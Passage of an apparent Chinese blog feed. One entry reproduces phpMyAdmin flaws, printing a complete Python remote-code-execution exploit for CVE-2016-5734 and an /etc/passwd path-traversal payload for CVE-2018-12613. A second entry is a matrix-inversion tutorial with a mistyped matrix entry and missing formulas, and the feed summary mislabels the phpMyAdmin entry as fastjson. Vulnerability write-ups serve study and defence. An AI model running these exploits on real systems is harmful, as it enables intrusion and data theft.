alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%208.png"></p><p>发现可以通过<code>request</code>方法来接收变量将他变成全局变量</p><p><code>db</code>即为数据库，<code>table</code>为数据表,所以第三个参数<code>row[0]</code>，经过对刚刚sql语句的分析，获取到的内容为指定数据库的指定数据表内的第一个字段值  ，至此三个参数均可控制</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit</span></span><br><span class="line"><span class="string">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.</span></span><br><span class="line"><span class="string">CVE: CVE-2016-5734</span></span><br><span class="line"><span class="string">Author: https://twitter.com/iamsecurity</span></span><br><span class="line"><span class="string">run: ./cve-2016-5734.py -u root --pwd=&quot;&quot; http://localhost/pma -c &quot;system(&#x27;ls -lua&#x27;);&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&quot;@iamsecurity&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;URL with path to PMA&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;--cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;PHP command(s) to eval()&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--pwd&quot;</span>, required=<span class="literal">True</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Password for valid PMA user&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="string">&quot;--dbs&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Existing database at a server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--table&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Custom table name for exploit.&quot;</span>)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    <span class="keyword">if</span> arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        db = <span class="string">&quot;test&quot;</span></span><br><span class="line">    token = <span class="literal">False</span></span><br><span class="line">    custom_table = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> arguments.table:</span><br><span class="line">        custom_table = <span class="literal">True</span></span><br><span class="line">        table = arguments.table</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table = <span class="string">&quot;prgpwn&quot;</span></span><br><span class="line">    <span class="keyword">if</span> arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;system(&#x27;uname -a&#x27;);&quot;</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">32</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    <span class="comment"># you can manually add proxy support it&#x27;s very simple ;)</span></span><br><span class="line">    <span class="comment"># s.proxies = &#123;&#x27;http&#x27;: &quot;127.0.0.1:8080&quot;, &#x27;https&#x27;: &quot;127.0.0.1:8080&quot;&#125;</span></span><br><span class="line">    s.verify = <span class="literal">False</span></span><br><span class="line">    sql = <span class="string">&#x27;&#x27;&#x27;CREATE TABLE `&#123;0&#125;` (</span></span><br><span class="line"><span class="string">      `first` varchar(10) CHARACTER SET utf8 NOT NULL</span></span><br><span class="line"><span class="string">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span></span><br><span class="line"><span class="string">    INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX(&#x27;302F6500&#x27;));</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get_token</span></span><br><span class="line">    resp = s.post(url_to_pma + <span class="string">&quot;/?lang=en&quot;</span>, <span class="built_in">dict</span>(</span><br><span class="line">        pma_username=uname,</span><br><span class="line">        pma_password=upass</span><br><span class="line">    ))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code <span class="keyword">is</span> <span class="number">200</span>:</span><br><span class="line">        token_place = resp.text.find(<span class="string">&quot;token=&quot;</span>) + <span class="number">6</span></span><br><span class="line">        token = resp.text[token_place:token_place + <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        print(<span class="string">&quot;Cannot get valid authorization token.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> custom_table <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;is_js_confirmed&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">            <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">            <span class="string">&quot;pos&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;sql_query&quot;</span>: sql,</span><br><span class="line">            <span class="string">&quot;sql_delimiter&quot;</span>: <span class="string">&quot;;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;show_query&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;fk_checks&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SQL&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ajax_page_request&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = s.post(url_to_pma + <span class="string">&quot;/import.php&quot;</span>, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> resp.json():</span><br><span class="line">                <span class="keyword">if</span> resp.json()[<span class="string">&quot;success&quot;</span>] <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">                    first = resp.json()[<span class="string">&quot;error&quot;</span>][resp.json()[<span class="string">&quot;error&quot;</span>].find(<span class="string">&quot;&lt;code&gt;&quot;</span>)+<span class="number">6</span>:]</span><br><span class="line">                    error = first[:first.find(<span class="string">&quot;&lt;/code&gt;&quot;</span>)]</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;already exists&quot;</span> <span class="keyword">in</span> error:</span><br><span class="line">                        print(error)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&quot;ERROR: &quot;</span> + error)</span><br><span class="line">                        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># build exploit</span></span><br><span class="line">    exploit = &#123;</span><br><span class="line">        <span class="string">&quot;db&quot;</span>: db,</span><br><span class="line">        <span class="string">&quot;table&quot;</span>: table,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;goto&quot;</span>: <span class="string">&quot;sql.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;find&quot;</span>: <span class="string">&quot;0/e\0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;replaceWith&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;columnIndex&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;useRegex&quot;</span>: <span class="string">&quot;on&quot;</span>,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ajax_request&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(</span><br><span class="line">        url_to_pma + <span class="string">&quot;/tbl_find_replace.php&quot;</span>, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        result = resp.json()[<span class="string">&quot;message&quot;</span>][resp.json()[<span class="string">&quot;message&quot;</span>].find(<span class="string">&quot;&lt;/a&gt;&quot;</span>)+<span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result):</span><br><span class="line">            print(<span class="string">&quot;result: &quot;</span> + result)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        print(</span><br><span class="line">            <span class="string">&quot;Exploit failed!\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Try to manually set exploit parameters like --table, --database and --token.\n&quot;</span></span><br><span class="line">            <span class="string">&quot;Remember that servers with PHP version greater than 5.4.6&quot;</span></span><br><span class="line">            <span class="string">&quot; is not exploitable, because of warning about null byte in regexp&quot;</span></span><br><span class="line">        )</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>用exp-db的exp可以直接打大概是先建好一个名为<code>prgpwn</code>的数据库再在里面建一个叫<code>first</code>的字段，这样就知道了db对应的table，接了下来就利用%00截断来使<code>preg_replace被</code>e修饰符所修饰</p><p>即使用<code>find=</code>0/e\0,<code>replaceWith</code>=payload</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%209.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%209.png"></p><p>最终类似于执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">&quot;/0/e&quot;</span>,<span class="string">&quot;system(&#x27;xxxx&#x27;);&quot;</span>,<span class="string">&quot;0/e&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="CVE-2018-12613本地文件包含漏洞"><a href="#CVE-2018-12613本地文件包含漏洞" class="headerlink" title="CVE-2018-12613本地文件包含漏洞"></a>CVE-2018-12613本地文件包含漏洞</h1><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>phpmyadmin 4.8.0</li><li>phpmyadmin 4.8.0.1</li><li>phpmyadmin 4.8.1</li></ul><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞利用点在index.php里的以下代码</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2010.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2010.png"></p><p><code>target</code>可以传入一个值，然后可以利用这个<code>target</code>来进行文件包含，用来达到本地文件包含</p><p>想要达到这个目的，那么target需要满足&amp;&amp;后面的几个条件，即以下条件</p><ul><li>不能为空</li><li>是字符串</li><li>不能以<code>index</code>开头</li><li>不在黑名单<code>target_blacklist</code>中</li><li>可以通过函数<code>checkPageValidity</code>的验证</li></ul><p>黑名单要求参数不是<code>import.php</code> 或 <code>export.php</code> 就行</p><p>接下来那就来看看<code>checkPageValidity</code>函数是怎么验证的</p><p>函数定义在\libraries\classes\Core.php</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2011.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2011.png"></p><p>要通过验证，既要函数返回true</p><p>则包含的文件必须包含在白名单<code>whitelist</code>中</p><p>那我们先去看看白名单有啥</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2012.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2012.png"></p><p>接下来分析以下check函数几种返回true的情况，看看有没有可以利用的</p><p>第一个是直接看在不在白名单里，没有操作空间</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2013.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2013.png"></p><p>再来看看第二个</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2014.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2014.png"></p><p>这里涉及两个函数mb_substr和mb_strpos</p><p>mb_substr的定义，简单来说这个函数就是获取子字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mb_substr(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = mb_internal_encoding()</span><br><span class="line">): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p><strong>参数解释</strong></p><ul><li><strong><code>str</code></strong>从该 string 中提取子字符串。</li><li><strong><code>start</code></strong>如果 <strong><code>start</code></strong> 不是负数，返回的字符串会从 <strong><code>str</code></strong> 第 <strong><code>start</code></strong> 的位置开始，从 0 开始计数。举个例子，字符串 ‘<code>abcdef</code>‘，位置 <code>0</code> 的字符是 ‘<code>a</code>‘，位置 <code>2</code> 的字符是 ‘<code>c</code>‘，以此类推。<br>如果 <strong><code>start</code></strong> 是负数，返回的字符串是从 <strong><code>str</code></strong> 末尾处第 <strong><code>start</code></strong> 个字符开始的。</li><li><strong><code>length str</code></strong> 中要使用的最大字符数。如果省略了此参数或者传入了 <code>NULL</code>，则会提取到字符串的尾部。</li><li><strong><code>encoding  encoding</code></strong> 参数为字符编码。如果省略或是 <strong><code>null</code></strong>，则使用内部字符编码。</li></ul><p><strong>返回值</strong></p><p>mb_substr() 函数根据 start 和 length 参数返回 str 中指定的部分。</p><p>而mb_strpos，简单来说就是查找字符串在另一个字符串中首次出现的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mb_strpos(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = mb_internal_encoding()</span><br><span class="line">): <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p><strong>参数解释</strong></p><ul><li><strong><code>haystack</code></strong>要被检查的 string。</li><li><strong><code>needle</code></strong>在 <strong><code>haystack</code></strong> 中查找这个字符串。 和 <code>strpos()</code> 不同的是，数字的值不会被当做字符的顺序值。</li><li><strong><code>offset</code></strong>搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。</li><li><strong><code>encoding</code></strong> 参数为字符编码。如果省略或是 <strong><code>null</code></strong>，则使用内部字符编码。</li></ul><p><strong>返回值</strong></p><p>返回 string 的 haystack 中 needle 首次出现位置的数值。 如果没有找到 needle，它将返回 false。</p><p>了解两个函数以后，那这个返回true的条件就是?后面的字符串要满足白名单，也暂时无法找到利用方法</p><p>于是来看第三个返回true</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2015.png" alt="Untitled"></p><p>比起第二个返回true的地方，多了一个<code>urldecode</code>函数</p><p>那就简单了这里用url全编码方式对?进行编码就可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:/index.php?target=db_sql.php%<span class="number">3</span>f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">对于fastjson反序列化漏洞的分析和对于最新的1.2.47版本的JNDI注入绕过的复现</summary>
    
    
    
    <category term="漏洞复现" scheme="http://www.fxizenta.design/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="phpmyadmin" scheme="http://www.fxizenta.design/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpmyadmin/"/>
    
    
    <category term="RCE" scheme="http://www.fxizenta.design/tags/RCE/"/>
    
    <category term="文件包含" scheme="http://www.fxizenta.design/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>矩阵求逆的几种方法</title>
    <link href="http://www.fxizenta.design/2021/08/04/Matrix-inverse/"/>
    <id>http://www.fxizenta.design/2021/08/04/Matrix-inverse/</id>
    <published>2021-08-03T16:41:16.000Z</published>
    <updated>2021-08-27T15:33:06.133Z</updated>
    
    <content type="html"><![CDATA[<h1 id="矩阵求逆的几种方法"><a href="#矩阵求逆的几种方法" class="headerlink" title="矩阵求逆的几种方法"></a>矩阵求逆的几种方法</h1><p>在学习Hill算法的过程中，突然意识到自己对矩阵的很多东西都已经还给老师，于是打算把这个丢了快两年的东西重新捡起来学习一下</p><h1 id="待定系数法"><a href="#待定系数法" class="headerlink" title="待定系数法"></a>待定系数法</h1><p>比较适用于低阶的矩阵，高阶矩阵计算量有亿点点大</p><p>没啥好说的，就是列个矩阵方程然后再分解为我们所熟知的方程格式</p><p>然后再求解</p><p>eg：</p><p>$\left[ \begin{matrix} 1 &amp; 2 \\ -1 &amp;-3  \end{matrix} \right]$的逆矩阵的求解</p><p>设逆矩阵为$\left[ \begin{matrix} a &amp; b \\ c &amp;d  \end{matrix} \right]$</p><p>则$\left[ \begin{matrix} 1 &amp; 2 \\ -2 &amp;-3  \end{matrix} \right]\left[ \begin{matrix} a &amp; b \\ c &amp;d  \end{matrix} \right]=\left[ \begin{matrix} 1 &amp; 0 \\ 0 &amp;1  \end{matrix} \right]$</p><p>即有</p><p>$\left[ \begin{matrix} a+2c &amp; b+2d \\ -2a-3c &amp;-2b-3d  \end{matrix} \right]=\left[ \begin{matrix} 1 &amp; 0 \\ 0 &amp;1  \end{matrix} \right]$</p><p>可以得到以下方程</p><p>$a+2c=1$</p><p>$b+2d=0$</p><p>$-2a-3c=0$</p><p>$-2b-3d=1$</p><p>解得a=-3,b=-2,c=2,d=1</p><h1 id="高斯消元法"><a href="#高斯消元法" class="headerlink" title="高斯消元法"></a>高斯消元法</h1><p>这个应该是流传最广的求逆元版本，虽然我除了在考试手算中有所应用，目前还没有看到其他使用这个的地方</p><p>高斯消元法有两个细分：行变换与列变换，原理是一样的，一般用行变换。</p><p>高斯消元法先将矩阵A与单位矩阵I进行连接形成一个新的增广矩阵.</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt="%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%20121b63c332ea4e9b8e1a43957b6070ff/Untitled.png"></p><p>eg:</p><p>$K=\left[ \begin{matrix} 2 &amp; -1 &amp; 0 \\ -1 &amp;2 &amp; -1 \\ 0 &amp;-1&amp; 2  \end{matrix} \right]$</p><p>接下来用高斯消元法来求K的逆矩阵</p><p>$\left[ \begin{matrix} K&amp;I  \end{matrix} \right]=\left[ \begin{matrix} 2 &amp; -1 &amp; 0 &amp;1&amp;0&amp;0\\ -1 &amp;2 &amp; -1&amp;0&amp;1&amp;0 \\ 0 &amp;-1&amp; 2&amp;0&amp;0&amp;1  \end{matrix} \right]$→$\left[ \begin{matrix} 2 &amp; -1 &amp; 0 &amp;1&amp;0&amp;0\\ 0 &amp;3/2 &amp; -1&amp;1/2&amp;1&amp;0 \\ 0 &amp;-1&amp; 2&amp;0&amp;0&amp;1  \end{matrix} \right]$→$\left[ \begin{matrix} 2 &amp; -1 &amp; 0 &amp;1&amp;0&amp;0\\ 0 &amp;3/2 &amp; -1&amp;1/2&amp;1&amp;0 \\ 0 &amp;0&amp; 4/3&amp;1/3&amp;2/3&amp;1  \end{matrix} \right]$</p><p>K矩阵变成了上三角矩阵，接下来回代就可以分别求解出$K^{-1}$,如下</p><p>$\left[ \begin{matrix} 2 &amp; -1 &amp; 0 &amp;1&amp;0&amp;0\\ 0 &amp;3/2 &amp; 0&amp;3/4&amp;3/2&amp;3/4 \\ 0 &amp;0&amp; 4/3&amp;1/3&amp;2/3&amp;1  \end{matrix} \right]$→$\left[ \begin{matrix} 2 &amp; 0 &amp; 0 &amp;3/2&amp;1&amp;1/2\\ 0 &amp;3/2 &amp; 0&amp;3/4&amp;3/2&amp;3/4 \\ 0 &amp;0&amp; 4/3&amp;1/3&amp;2/3&amp;1  \end{matrix} \right]$→</p><p>$\left[ \begin{matrix} 1 &amp; 0 &amp; 0 &amp;3/4&amp;1/2&amp;1/4\\ 0 &amp;1 &amp; 0&amp;1/2&amp;1&amp;1/2 \\ 0 &amp;0&amp; 1&amp;1/4&amp;1/2&amp;3/4  \end{matrix} \right]=$$\left[ \begin{matrix} I &amp; K^{-1}   \end{matrix} \right]$</p><p>求得逆矩阵$K^{-1}$</p><h1 id="LU分解法"><a href="#LU分解法" class="headerlink" title="LU分解法"></a>LU分解法</h1><p>LU分解法实际上是高斯消元法的变种应用，这个方法更易于实现并行化。计算机基本用这种方法，面对大矩阵时有奇效。</p><p>LU分解即将一个矩阵分解为一个单位下三角矩阵和一个上三角矩阵的乘积。</p><p>需要注意的是，不是所有的矩阵都可以进行LU分解的</p><h2 id="LU分解的前提"><a href="#LU分解的前提" class="headerlink" title="LU分解的前提"></a>LU分解的前提</h2><ol><li>矩阵是方阵（LU分解主要是针对方阵）；</li><li>矩阵是可逆的，也就是该矩阵是满秩矩阵，每一行都是独立向量；</li><li>消元过程中没有0主元出现，也就是消元过程中不能出现行交换的初等变换</li></ol><h2 id="LU分解求逆矩阵的流程"><a href="#LU分解求逆矩阵的流程" class="headerlink" title="LU分解求逆矩阵的流程"></a>LU分解求逆矩阵的流程</h2><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt=""></p><h1 id="SVD分解法"><a href="#SVD分解法" class="headerlink" title="SVD分解法"></a>SVD分解法</h1><p>即奇异值分解法(SingularValue Decomposition)</p><p>SVD分解可以对不是方阵的矩阵进行分解</p><p>SVD分解将矩阵A分解为三个矩阵的乘积，分别为正交矩阵U、对角矩阵W和正交矩阵的转置矩阵V</p><p>$A=UWV^T$</p><p>U是一个$mXm$的的矩阵，W是一个$mXn$的矩阵，且除了主对角线上的元素以外全为0.主对角线上的每个元素都被称为奇异值，V是一个$nXn$的矩阵</p><p>求逆即</p><p>$A^{-1}=VW^{-1}U^T$</p><h2 id="如何得到-UWV-T"><a href="#如何得到-UWV-T" class="headerlink" title="如何得到$UWV^T$"></a>如何得到$UWV^T$</h2><p>我们先将A和A的转置做矩阵乘法，那么会得到m*m的一个方阵$AA^T$,既然$AA^T$是方阵，所以可以进行特征分解可以得到</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt="%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%20121b63c332ea4e9b8e1a43957b6070ff/Untitled%202.png"></p><p>可以得到矩阵 [公式] 的n个特征值和对应的n个特征向量v了。将 [公式] 的所有特征向量张成一个n×n的矩阵V,于是我们就得到了矩阵V，我们把V中的每个特征向量叫做A的右奇异向量。</p><p>同理我们可以特征分解到特征值和特征向量满足下式</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%203.png" alt="%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%20121b63c332ea4e9b8e1a43957b6070ff/Untitled%203.png"></p><p>同理，[公式] 